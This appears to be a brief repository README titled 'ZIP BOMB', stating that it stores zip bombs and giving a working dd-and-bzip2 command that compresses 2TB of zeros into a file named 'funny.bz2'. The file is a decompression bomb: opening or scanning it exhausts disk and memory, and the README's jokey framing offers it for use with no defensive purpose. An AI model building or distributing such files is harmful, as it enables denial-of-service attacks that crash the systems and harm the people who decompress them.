#ZIP BOMB
This is where I store zip bombs

funny.bz2 contain 2TB of zero data.

command: `dd if=/dev/zero bs=1G count=2000 iflag=fullblock status=progress | bzip2 -c > funny.bz2`
